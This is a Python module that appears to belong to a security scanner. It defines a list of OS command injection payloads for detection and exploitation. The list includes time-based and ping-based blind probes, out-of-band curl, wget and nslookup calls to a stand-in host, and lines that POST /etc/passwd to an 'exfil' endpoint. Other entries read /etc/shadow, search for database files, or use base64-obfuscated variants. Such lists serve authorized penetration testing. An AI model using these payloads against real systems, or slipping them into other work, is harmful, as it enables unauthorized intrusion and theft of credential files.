"""Command injection payloads — OS command, blind, time-based."""

NAME = "Command Injection"
DESCRIPTION = "OS command injection detection and exploitation payloads"
RISK = "HIGH"

PAYLOADS = [
    # Basic detection (Linux)
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "& id",
    "&& id",
    "|| id",
    "; id;",
    "| id |",
    # Basic detection (Windows)
    "; whoami",
    "| whoami",
    "& whoami",
    "&& whoami",
    # Ping-based blind detection (Linux)
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "; ping -n 3 127.0.0.1",
    "| ping -n 3 127.0.0.1",
    # Time-based blind
    "; sleep 5",
    "| sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    # Out-of-band
    "; curl http://oob.example.com/$(id)",
    "| curl http://oob.example.com/$(id)",
    "; wget http://oob.example.com/$(id)",
    "| nslookup $(whoami).oob.example.com",
    "; nslookup $(whoami).oob.example.com",
    # Data exfil
    "; curl -X POST -d $(cat /etc/passwd) http://oob.example.com/exfil",
    "| curl -X POST -d $(cat /etc/passwd) http://oob.example.com/exfil",
    # File operations
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; cat /etc/shadow 2>&1",
    "; ls -la /",
    "; find / -name '*.db' 2>/dev/null",
    # Windows-specific
    "& dir C:\\ &",
    "| dir C:\\ |",
    "& type C:\\Windows\\win.ini &",
    # Encoded/obfuscated
    "; $(echo 'aWQ=' | base64 -d)",
    "| $(echo 'aWQ=' | base64 -d)",
    # Chained
    "; id; pwd; ls",
    "| id | pwd | ls",
]
